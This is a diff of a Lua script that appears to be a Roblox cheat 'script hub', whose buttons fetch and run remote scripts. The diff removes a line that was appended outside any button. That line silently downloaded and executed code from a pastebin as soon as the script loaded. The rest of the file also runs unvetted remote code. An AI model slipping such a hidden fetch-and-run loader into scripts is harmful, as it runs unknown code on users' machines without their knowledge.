@@ -759,7 +759,7 @@ HubsTab:CreateButton({Name="CMD-X",Callback=function()loadstring(game:HttpGet("h
 HubsTab:CreateButton({Name="Fates Admin",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/source.lua"))()end})
 HubsTab:CreateButton({Name="Orca",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua"))()end})
 HubsTab:CreateButton({Name="Epik Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Universal-Script-Epik-Hub-Blox-Fruits-Fisch-Evade-and-More-23406"))()end})
-HubsTab:CreateButton({Name="Ez Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Ez-Hub_168"))()end}) loadstring(game:HttpGet("https://paste.debian.net/plainh/c5e63588/", true))()
+HubsTab:CreateButton({Name="Ez Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Ez-Hub_168"))()end}) 
 HubsTab:CreateButton({Name="Ultimate Hub V2",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Universal-Script-Ultimate-Hub-V2-9718"))()end})
 HubsTab:CreateButton({Name="Forge Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Universal-Script-Forge-Hub-41461"))()end})
 HubsTab:CreateButton({Name="Moldovan Admin",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdminClassic/refs/heads/main/main.lua"))()end})
